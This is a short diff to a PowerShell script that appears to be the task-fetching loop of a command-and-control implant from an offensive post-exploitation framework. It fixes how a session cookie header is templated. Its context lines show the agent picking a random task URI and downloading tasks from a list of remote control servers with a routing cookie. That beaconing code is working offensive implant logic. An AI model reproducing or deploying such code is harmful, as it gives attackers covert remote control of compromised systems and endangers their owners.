@@ -95,7 +95,7 @@ $Script:GetTask = {
             if($Script:Headers){
                 $Script:Headers.GetEnumerator() | ForEach-Object { $wc.Headers.Add($_.Name, $_.Value) }
             }
-            $wc.Headers.Add("Cookie","{{ session_cookie }}session=$RoutingCookie")
+            $wc.Headers.Add("Cookie","{{ session_cookie }}=$RoutingCookie")
 
             $taskURI = $Script:TaskURIs | Get-Random
             $result = $wc.DownloadData($Script:ControlServers[$Script:ServerIndex] + $taskURI)
